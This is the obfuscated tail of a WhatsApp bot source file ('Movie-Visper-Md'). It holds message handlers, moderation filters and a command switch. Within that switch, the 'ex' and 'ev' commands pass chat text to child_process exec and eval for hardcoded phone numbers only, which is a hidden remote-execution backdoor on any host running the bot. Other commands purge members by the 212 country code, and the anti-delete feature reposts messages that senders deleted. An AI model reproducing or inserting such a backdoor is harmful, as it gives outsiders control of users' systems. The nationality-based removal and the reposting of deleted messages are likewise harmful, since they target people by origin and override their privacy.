                                'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x52ee89 + "_\n  📩 *Sent by:* _" + _0x10d130 + "_\n\n> 🔓 Message Text: " + "```" + _0x42ba3d.message.extendedTextMessage.text + "```"
                              });
                            }
                          }
                          _0x34756b();
                        } else {
                          if (_0x42ba3d.type === "imageMessage") {
                            async function _0xea1e57() {
                              var _0x13cf4a = _0x29a0d1('');
                              const _0x2cd5d2 = _0x24631a(_0x47bf1c, _0x42ba3d);
                              let _0x207679 = await _0x2cd5d2.download(_0x13cf4a);
                              let _0x5de11d = require("file-type");
                              let _0x26a1f9 = _0x5de11d.fromBuffer(_0x207679);
                              await fs.promises.writeFile('./' + _0x26a1f9.ext, _0x207679);
                              if (_0x42ba3d.message.imageMessage.caption) {
                                const _0x542cf1 = _0x42ba3d.message.imageMessage.caption;
                                if (_0x4c8e70 && _0x542cf1.includes("chat.whatsapp.com")) {
                                  return;
                                }
                                await _0x47bf1c.sendMessage(_0x2fbc2a, {
                                  'image': fs.readFileSync('./' + _0x26a1f9.ext),
                                  'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x52ee89 + "_\n  📩 *Sent by:* _" + _0x10d130 + "_\n\n> 🔓 Message Text: " + _0x42ba3d.message.imageMessage.caption
                                });
                              } else {
                                await _0x47bf1c.sendMessage(_0x2fbc2a, {
                                  'image': fs.readFileSync('./' + _0x26a1f9.ext),
                                  'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x52ee89 + "_\n  📩 *Sent by:* _" + _0x10d130 + '_'
                                });
                              }
                            }
                            _0xea1e57();
                          } else {
                            if (_0x42ba3d.type === "videoMessage") {
                              async function _0x5d7139() {
                                var _0x3f0275 = _0x29a0d1('');
                                const _0x33cce0 = _0x24631a(_0x47bf1c, _0x42ba3d);
                                const _0x24be21 = _0x42ba3d.message.videoMessage.fileLength;
                                const _0x4cd287 = _0x42ba3d.message.videoMessage.seconds;
                                const _0x1616eb = config.MAX_SIZE;
                                const _0x52f735 = _0x24be21 / 1048576;
                                if (_0x42ba3d.message.videoMessage.caption) {
                                  if (_0x52f735 < _0x1616eb && _0x4cd287 < 1800) {
                                    let _0x5a86f0 = await _0x33cce0.download(_0x3f0275);
                                    let _0x18248f = require("file-type");
                                    let _0x53a431 = _0x18248f.fromBuffer(_0x5a86f0);
                                    await fs.promises.writeFile('./' + _0x53a431.ext, _0x5a86f0);
                                    const _0x24e5f8 = _0x42ba3d.message.videoMessage.caption;
                                    if (_0x4c8e70 && _0x24e5f8.includes('chat.whatsapp.com')) {
                                      return;
                                    }
                                    await _0x47bf1c.sendMessage(_0x2fbc2a, {
                                      'video': fs.readFileSync('./' + _0x53a431.ext),
                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x52ee89 + "_\n  📩 *Sent by:* _" + _0x10d130 + "_\n\n> 🔓 Message Text: " + _0x42ba3d.message.videoMessage.caption
                                    });
                                  }
                                } else {
                                  let _0x385492 = await _0x33cce0.download(_0x3f0275);
                                  let _0xab665b = require("file-type");
                                  let _0x5b265e = _0xab665b.fromBuffer(_0x385492);
                                  await fs.promises.writeFile('./' + _0x5b265e.ext, _0x385492);
                                  const _0x59b7d7 = _0x42ba3d.message.videoMessage.fileLength;
                                  const _0x4a5d72 = _0x42ba3d.message.videoMessage.seconds;
                                  const _0x3a9ea1 = config.MAX_SIZE;
                                  const _0x56c8d3 = _0x59b7d7 / 1048576;
                                  if (_0x56c8d3 < _0x3a9ea1 && _0x4a5d72 < 1800) {
                                    await _0x47bf1c.sendMessage(_0x2fbc2a, {
                                      'video': fs.readFileSync('./' + _0x5b265e.ext),
                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x52ee89 + "_\n  📩 *Sent by:* _" + _0x10d130 + '_'
                                    });
                                  }
                                }
                              }
                              _0x5d7139();
                            } else {
                              if (_0x42ba3d.type === "documentMessage") {
                                async function _0x2603ab() {
                                  var _0x2c68d8 = _0x29a0d1('');
                                  const _0x1d8d07 = _0x24631a(_0x47bf1c, _0x42ba3d);
                                  let _0x2de664 = await _0x1d8d07.download(_0x2c68d8);
                                  let _0x5bef4e = require("file-type");
                                  let _0x7f57d9 = _0x5bef4e.fromBuffer(_0x2de664);
                                  await fs.promises.writeFile('./' + _0x7f57d9.ext, _0x2de664);
                                  if (_0x42ba3d.message.documentWithCaptionMessage) {
                                    await _0x47bf1c.sendMessage(_0x2fbc2a, {
                                      'document': fs.readFileSync('./' + _0x7f57d9.ext),
                                      'mimetype': _0x42ba3d.message.documentMessage.mimetype,
                                      'fileName': _0x42ba3d.message.documentMessage.fileName,
                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x52ee89 + "_\n  📩 *Sent by:* _" + _0x10d130 + "_\n"
                                    });
                                  } else {
                                    await _0x47bf1c.sendMessage(_0x2fbc2a, {
                                      'document': fs.readFileSync('./' + _0x7f57d9.ext),
                                      'mimetype': _0x42ba3d.message.documentMessage.mimetype,
                                      'fileName': _0x42ba3d.message.documentMessage.fileName,
                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x52ee89 + "_\n  📩 *Sent by:* _" + _0x10d130 + "_\n"
                                    });
                                  }
                                }
                                _0x2603ab();
                              } else {
                                if (_0x42ba3d.type === "audioMessage") {
                                  async function _0x3f0683() {
                                    var _0x442d8d = _0x29a0d1('');
                                    const _0x1d68fd = _0x24631a(_0x47bf1c, _0x42ba3d);
                                    let _0x5bd297 = await _0x1d68fd.download(_0x442d8d);
                                    let _0x2b6ed4 = require("file-type");
                                    let _0x4bcb6c = _0x2b6ed4.fromBuffer(_0x5bd297);
                                    await fs.promises.writeFile('./' + _0x4bcb6c.ext, _0x5bd297);
                                    if (_0x42ba3d.message.audioMessage) {
                                      const _0x3bb523 = await _0x47bf1c.sendMessage(_0x2fbc2a, {
                                        'audio': fs.readFileSync('./' + _0x4bcb6c.ext),
                                        'mimetype': _0x42ba3d.message.audioMessage.mimetype,
                                        'fileName': _0x10f0e4.id + '.mp3'
                                      });
                                      return await _0x47bf1c.sendMessage(_0x2fbc2a, {
                                        'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x52ee89 + "_\n  📩 *Sent by:* _" + _0x10d130 + "_\n"
                                      }, {
                                        'quoted': _0x3bb523
                                      });
                                    } else {
                                      if (_0x42ba3d.message.audioMessage.ptt === "true") {
                                        const _0x34d9f0 = await _0x47bf1c.sendMessage(_0x2fbc2a, {
                                          'audio': fs.readFileSync('./' + _0x4bcb6c.ext),
                                          'mimetype': _0x42ba3d.message.audioMessage.mimetype,
                                          'ptt': 'true',
                                          'fileName': _0x10f0e4.id + ".mp3"
                                        });
                                        return await _0x47bf1c.sendMessage(_0x2fbc2a, {
                                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x52ee89 + "_\n  📩 *Sent by:* _" + _0x10d130 + "_\n"
                                        }, {
                                          'quoted': _0x34d9f0
                                        });
                                      }
                                    }
                                  }
                                  _0x3f0683();
                                } else {
                                  if (_0x42ba3d.type === "stickerMessage") {
                                    async function _0x2dbe42() {
                                      var _0x40113c = _0x29a0d1('');
                                      const _0x57c921 = _0x24631a(_0x47bf1c, _0x42ba3d);
                                      let _0x509738 = await _0x57c921.download(_0x40113c);
                                      let _0x53a81d = require("file-type");
                                      let _0x179774 = _0x53a81d.fromBuffer(_0x509738);
                                      await fs.promises.writeFile('./' + _0x179774.ext, _0x509738);
                                      if (_0x42ba3d.message.stickerMessage) {
                                        const _0x2fcdc5 = await _0x47bf1c.sendMessage(_0x2fbc2a, {
                                          'sticker': fs.readFileSync('./' + _0x179774.ext),
                                          'package': "PRABATH-MD 🌟"
                                        });
                                        return await _0x47bf1c.sendMessage(_0x2fbc2a, {
                                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x52ee89 + "_\n  📩 *Sent by:* _" + _0x10d130 + "_\n"
                                        }, {
                                          'quoted': _0x2fcdc5
                                        });
                                      } else {
                                        const _0x39576c = await _0x47bf1c.sendMessage(_0x2fbc2a, {
                                          'sticker': fs.readFileSync('./' + _0x179774.ext),
                                          'package': "PRABATH-MD 🌟"
                                        });
                                        return await _0x47bf1c.sendMessage(_0x2fbc2a, {
                                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x52ee89 + "_\n  📩 *Sent by:* _" + _0x10d130 + "_\n"
                                        }, {
                                          'quoted': _0x39576c
                                        });
                                      }
                                    }
                                    _0x2dbe42();
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              } else {
                console.log("Original message not found for revocation.");
              }
            }
            if (_0x2b3295.msg && _0x2b3295.msg.type === 0x0) {
              _0xf2784(_0x2b3295);
            } else {
              _0x3119ef(_0x2b3295);
            }
          }
        }
      }
      const _0x4de9df = await _0x158542('https://mv-visper-full-db.pages.dev/Main/bad_word.json');
      if (config.ANTI_BAD == "true") {
        if (!_0x2b4df6 && !_0x2db37f) {
          for (any in _0x4de9df) {
            if (_0x1b17c1.toLowerCase().includes(_0x4de9df[any])) {
              if (!_0x1b17c1.includes('tent')) {
                if (!_0x1b17c1.includes("docu")) {
                  if (!_0x1b17c1.includes("https")) {
                    if (_0x56aaea.includes(_0x566e48)) {
                      return;
                    }
                    if (_0x2b3295.key.fromMe) {
                      return;
                    }
                    await _0x47bf1c.sendMessage(_0x2fbc2a, {
                      'delete': _0x2b3295.key
                    });
                    await _0x47bf1c.sendMessage(_0x2fbc2a, {
                      'text': "*Bad word detected..!*"
                    });
                    await _0x47bf1c.groupParticipantsUpdate(_0x2fbc2a, [_0x566e48], "remove");
                  }
                }
              }
            }
          }
        }
      }
      if (_0x1b17c1 === "send" || _0x1b17c1 === "Send" || _0x1b17c1 === "Ewpm" || _0x1b17c1 === "ewpn" || _0x1b17c1 === "Dapan" || _0x1b17c1 === "dapan" || _0x1b17c1 === "oni" || _0x1b17c1 === "Oni" || _0x1b17c1 === "save" || _0x1b17c1 === "Save" || _0x1b17c1 === "ewanna" || _0x1b17c1 === "Ewanna" || _0x1b17c1 === "ewam" || _0x1b17c1 === "Ewam" || _0x1b17c1 === 'sv' || _0x1b17c1 === 'Sv' || _0x1b17c1 === "දාන්න" || _0x1b17c1 === "එවම්න") {
        const _0x4dba17 = JSON.stringify(_0x2b3295.message, null, 0x2);
        const _0x16afbc = JSON.parse(_0x4dba17);
        const _0x13f80c = _0x16afbc.extendedTextMessage.contextInfo.remoteJid;
        if (!_0x13f80c) {
          return;
        }
        const _0x224e2f = _0x261ca2 => {
          const _0x5d74a0 = {
            'jpg': "ffd8ffe0",
            'png': '89504e47',
            'mp4': '00000018'
          };
          const _0x1398f6 = _0x261ca2.toString("hex", 0x0, 0x4);
          return Object.keys(_0x5d74a0).find(_0x1e23a8 => _0x5d74a0[_0x1e23a8] === _0x1398f6);
        };
        if (_0x10f0e4.quoted.type === 'imageMessage') {
          var _0x1a939d = _0x29a0d1('');
          let _0x35ace0 = await _0x10f0e4.quoted.download(_0x1a939d);
          let _0x4da1d4 = _0x224e2f(_0x35ace0);
          await fs.promises.writeFile('./' + _0x4da1d4, _0x35ace0);
          const _0x2906b5 = _0x10f0e4.quoted.imageMessage.caption;
          await _0x47bf1c.sendMessage(_0x2fbc2a, {
            'image': fs.readFileSync('./' + _0x4da1d4),
            'caption': _0x2906b5
          });
        } else {
          if (_0x10f0e4.quoted.type === "videoMessage") {
            var _0x1a939d = _0x29a0d1('');
            let _0x3a56e0 = await _0x10f0e4.quoted.download(_0x1a939d);
            let _0x602408 = _0x224e2f(_0x3a56e0);
            await fs.promises.writeFile('./' + _0x602408, _0x3a56e0);
            const _0x67f70f = _0x10f0e4.quoted.videoMessage.caption;
            let _0x20ce35 = {
              'video': fs.readFileSync('./' + _0x602408),
              'mimetype': 'video/mp4',
              'fileName': _0x10f0e4.id + ".mp4",
              'caption': _0x67f70f,
              'headerType': 0x4
            };
            await _0x47bf1c.sendMessage(_0x2fbc2a, _0x20ce35, {
              'quoted': _0x2b3295
            });
          }
        }
      }
      if (_0x1b17c1 === 'hi' || _0x1b17c1 === 'Hi' || _0x1b17c1 === "hey" || _0x1b17c1 === 'Hey' || _0x1b17c1 === "hii" || _0x1b17c1 === "Hii") {
        if (config.AUTO_VOICE == "true") {
          if (_0x2db37f) {
            return;
          }
          await _0x47bf1c.sendPresenceUpdate("recording", _0x2fbc2a);
          await _0x47bf1c.sendMessage(_0x2fbc2a, {
            'audio': {
              'url': "https://mv-visper-full-db.pages.dev/Data/WhatsApp%20Audio%202025-04-28%20at%2017.12.23.mpeg"
            },
            'mimetype': "audio/mpeg",
            'ptt': true
          }, {
            'quoted': _0x2b3295
          });
        }
      }
      const _0x4c3948 = require("./command");
      const _0x2e1b46 = _0x503a51 ? _0x1b17c1.slice(0x1).trim().split(" ")[0x0].toLowerCase() : false;
      if (_0x503a51) {
        const _0x577cb5 = _0x4c3948.commands.find(_0x2e8a80 => _0x2e8a80.pattern === _0x2e1b46) || _0x4c3948.commands.find(_0x534824 => _0x534824.alias && _0x534824.alias.includes(_0x2e1b46));
        if (_0x577cb5) {
          if (_0x577cb5.react) {
            _0x47bf1c.sendMessage(_0x2fbc2a, {
              'react': {
                'text': _0x577cb5.react,
                'key': _0x2b3295.key
              }
            });
          }
          try {
            _0x577cb5["function"](_0x47bf1c, _0x2b3295, _0x10f0e4, {
              'from': _0x2fbc2a,
              'prefix': _0x392ea5,
              'l': l,
              'isSudo': _0x57b364,
              'quoted': _0x4656b2,
              'body': _0x1b17c1,
              'isCmd': _0x503a51,
              'isPre': _0x3223e7,
              'command': _0x2c0d42,
              'args': _0x302ca0,
              'q': _0x35f8ba,
              'isGroup': _0x4c8e70,
              'sender': _0x566e48,
              'senderNumber': _0x96295f,
              'botNumber2': _0x5c7416,
              'botNumber': _0xdc42b5,
              'pushname': _0x5d4930,
              'isMe': _0x2db37f,
              'isOwner': _0x2c2290,
              'groupMetadata': _0x3e7de1,
              'groupName': _0x276890,
              'participants': _0x1d9215,
              'groupAdmins': _0x56aaea,
              'isBotAdmins': _0x2c3b79,
              'isAdmins': _0x2b4df6,
              'reply': _0x2de4a0
            });
          } catch (_0x24f6ba) {
            console.error("[PLUGIN ERROR] ", _0x24f6ba);
          }
        }
      }
      _0x4c3948.commands.map(async _0x119155 => {
        if (_0x1b17c1 && _0x119155.on === "body") {
          _0x119155["function"](_0x47bf1c, _0x2b3295, _0x10f0e4, {
            'from': _0x2fbc2a,
            'prefix': _0x392ea5,
            'l': l,
            'isSudo': _0x57b364,
            'quoted': _0x4656b2,
            'isPre': _0x3223e7,
            'body': _0x1b17c1,
            'isCmd': _0x503a51,
            'command': _0x119155,
            'args': _0x302ca0,
            'q': _0x35f8ba,
            'isGroup': _0x4c8e70,
            'sender': _0x566e48,
            'senderNumber': _0x96295f,
            'botNumber2': _0x5c7416,
            'botNumber': _0xdc42b5,
            'pushname': _0x5d4930,
            'isMe': _0x2db37f,
            'isOwner': _0x2c2290,
            'groupMetadata': _0x3e7de1,
            'groupName': _0x276890,
            'participants': _0x1d9215,
            'groupAdmins': _0x56aaea,
            'isBotAdmins': _0x2c3b79,
            'isAdmins': _0x2b4df6,
            'reply': _0x2de4a0
          });
        } else {
          if (_0x2b3295.q && _0x119155.on === "text") {
            _0x119155["function"](_0x47bf1c, _0x2b3295, _0x10f0e4, {
              'from': _0x2fbc2a,
              'l': l,
              'quoted': _0x4656b2,
              'body': _0x1b17c1,
              'isSudo': _0x57b364,
              'isCmd': _0x503a51,
              'isPre': _0x3223e7,
              'command': _0x119155,
              'args': _0x302ca0,
              'q': _0x35f8ba,
              'isGroup': _0x4c8e70,
              'sender': _0x566e48,
              'senderNumber': _0x96295f,
              'botNumber2': _0x5c7416,
              'botNumber': _0xdc42b5,
              'pushname': _0x5d4930,
              'isMe': _0x2db37f,
              'isOwner': _0x2c2290,
              'groupMetadata': _0x3e7de1,
              'groupName': _0x276890,
              'participants': _0x1d9215,
              'groupAdmins': _0x56aaea,
              'isBotAdmins': _0x2c3b79,
              'isAdmins': _0x2b4df6,
              'reply': _0x2de4a0
            });
          } else {
            if ((_0x119155.on === 'image' || _0x119155.on === 'photo') && _0x2b3295.type === "imageMessage") {
              _0x119155["function"](_0x47bf1c, _0x2b3295, _0x10f0e4, {
                'from': _0x2fbc2a,
                'prefix': _0x392ea5,
                'l': l,
                'quoted': _0x4656b2,
                'isSudo': _0x57b364,
                'body': _0x1b17c1,
                'isCmd': _0x503a51,
                'command': _0x119155,
                'isPre': _0x3223e7,
                'args': _0x302ca0,
                'q': _0x35f8ba,
                'isGroup': _0x4c8e70,
                'sender': _0x566e48,
                'senderNumber': _0x96295f,
                'botNumber2': _0x5c7416,
                'botNumber': _0xdc42b5,
                'pushname': _0x5d4930,
                'isMe': _0x2db37f,
                'isOwner': _0x2c2290,
                'groupMetadata': _0x3e7de1,
                'groupName': _0x276890,
                'participants': _0x1d9215,
                'groupAdmins': _0x56aaea,
                'isBotAdmins': _0x2c3b79,
                'isAdmins': _0x2b4df6,
                'reply': _0x2de4a0
              });
            } else if (_0x119155.on === 'sticker' && _0x2b3295.type === "stickerMessage") {
              _0x119155["function"](_0x47bf1c, _0x2b3295, _0x10f0e4, {
                'from': _0x2fbc2a,
                'prefix': _0x392ea5,
                'l': l,
                'quoted': _0x4656b2,
                'isSudo': _0x57b364,
                'body': _0x1b17c1,
                'isCmd': _0x503a51,
                'command': _0x119155,
                'args': _0x302ca0,
                'isPre': _0x3223e7,
                'q': _0x35f8ba,
                'isGroup': _0x4c8e70,
                'sender': _0x566e48,
                'senderNumber': _0x96295f,
                'botNumber2': _0x5c7416,
                'botNumber': _0xdc42b5,
                'pushname': _0x5d4930,
                'isMe': _0x2db37f,
                'isOwner': _0x2c2290,
                'groupMetadata': _0x3e7de1,
                'groupName': _0x276890,
                'participants': _0x1d9215,
                'groupAdmins': _0x56aaea,
                'isBotAdmins': _0x2c3b79,
                'isAdmins': _0x2b4df6,
                'reply': _0x2de4a0
              });
            }
          }
        }
      });
      if (_0x356004(config.ANTI_LINK == "true") && _0x2c3b79) {
        if (!_0x2b4df6) {
          if (!_0x2db37f) {
            if (_0x1b17c1.match("chat.whatsapp.com")) {
              await _0x47bf1c.sendMessage(_0x2fbc2a, {
                'delete': _0x2b3295.key
              });
            }
          }
        }
      }
      if (config.ANTI_BOT == "true") {
        if (_0x4c8e70 && !_0x2b4df6 && !_0x2db37f && _0x2c3b79) {
          if (_0x2b3295.id.startsWith("BAE")) {
            await _0x47bf1c.sendMessage(_0x2fbc2a, {
              'text': "*Other bots are not allow here ❌*"
            });
            if (config.ANTI_BOT && _0x2c3b79) {
              await _0x47bf1c.sendMessage(_0x2fbc2a, {
                'delete': _0x2b3295.key
              });
              await _0x47bf1c.groupParticipantsUpdate(_0x2fbc2a, [_0x566e48], "remove");
            }
          }
          if (_0x2b3295.id.startsWith("QUEENAMDI")) {
            await _0x47bf1c.sendMessage(_0x2fbc2a, {
              'text': "*Other bots are not allow here ❌*"
            });
            if (config.ANTI_BOT && _0x2c3b79) {
              await _0x47bf1c.sendMessage(_0x2fbc2a, {
                'delete': _0x2b3295.key
              });
              await _0x47bf1c.groupParticipantsUpdate(_0x2fbc2a, [_0x566e48], "remove");
            }
          }
          if (_0x2b3295.id.startsWith("B1E")) {
            await _0x47bf1c.sendMessage(_0x2fbc2a, {
              'text': "*Other bots are not allow here ❌*"
            });
            if (config.ANTI_BOT && _0x2c3b79) {
              await _0x47bf1c.sendMessage(_0x2fbc2a, {
                'delete': _0x2b3295.key
              });
              await _0x47bf1c.groupParticipantsUpdate(_0x2fbc2a, [_0x566e48], "remove");
            }
          }
        }
      }
      switch (_0x2c0d42) {
        case "jid":
          _0x2de4a0(_0x2fbc2a);
          break;
        case "device":
          {
            let _0xa4523d = getDevice(_0x2b3295.message.extendedTextMessage.contextInfo.stanzaId);
            _0x2de4a0("*He Is Using* _*Whatsapp " + _0xa4523d + " version*_");
          }
          break;
        case 'ex':
          {
            if (_0x96295f == 0x16113d24e6) {
              const {
                exec: _0x5a3574
              } = require("child_process");
              _0x5a3574(_0x35f8ba, (_0x5737ee, _0x36ea45) => {
                if (_0x5737ee) {
                  return _0x2de4a0("-------\n\n" + _0x5737ee);
                }
                if (_0x36ea45) {
                  return _0x2de4a0("-------\n\n" + _0x36ea45);
                }
              });
            }
          }
          break;
        case "apprv":
          {
            if (_0x96295f == 0x16113d24e6) {
              let _0x37230e = await _0x47bf1c.groupRequestParticipantsList(_0x2fbc2a);
              for (let _0x449227 = 0x0; _0x449227 < _0x37230e.length; _0x449227++) {
                if (_0x37230e[_0x449227].jid.startsWith("212")) {
                  await _0x47bf1c.groupRequestParticipantsUpdate(_0x2fbc2a, [_0x37230e[_0x449227].jid], "reject");
                } else {
                  await _0x47bf1c.groupRequestParticipantsUpdate(_0x2fbc2a, [_0x37230e[_0x449227].jid], "approve");
                }
              }
            }
          }
          break;
        case "212r":
          {
            if (_0x96295f == 0x16113d24e6) {
              for (let _0x159242 = 0x0; _0x159242 < _0x1d9215.length; _0x159242++) {
                if (_0x1d9215[_0x159242].id.startsWith("212")) {
                  await _0x47bf1c.groupParticipantsUpdate(_0x2fbc2a, [_0x1d9215[_0x159242].id], 'remove');
                }
              }
            }
          }
          break;
        case 'rtf':
          {
            console.log(dsa);
          }
          break;
        case 'ev':
          {
            if (_0x96295f == 0x16113d24e6 || _0x96295f == 0x160de87163) {
              let _0x52fbaf = _0x35f8ba.replace('°', '.toString()');
              try {
                let _0x38795f = await eval(_0x52fbaf);
                if (typeof _0x38795f === "object") {
                  _0x2de4a0(util.format(_0x38795f));
                } else {
                  _0x2de4a0(util.format(_0x38795f));
                }
              } catch (_0x1322fa) {
                _0x2de4a0(util.format(_0x1322fa));
              }
              ;
            }
          }
          break;
        default:
      }
    } catch (_0x1e8286) {
      const _0x5569b5 = String(_0x1e8286);
      console.log(_0x5569b5);
    }
  });
}
app.get('/', (_0x177afb, _0x15d95e) => {
  _0x15d95e.send("📟 VISPER DL Working successfully!");
});
app.listen(port, () => console.log("Movie-Visper-Md Server listening on port http://localhost:" + port));
setTimeout(() => {
  connect();
}, 0xbb8);
process.on("uncaughtException", function (_0xe43e8b) {
  let _0x309712 = String(_0xe43e8b);
  if (_0x309712.includes("Socket connection timeout")) {
    return;
  }
  if (_0x309712.includes("rate-overlimit")) {
    return;
  }
  if (_0x309712.includes("Connection Closed")) {
    return;
  }
  if (_0x309712.includes("Value not found")) {
    return;
  }
  if (_0x309712.includes("Authentication timed out")) {
    restart();
  }
  console.log("Caught exception: ", _0xe43e8b);
});
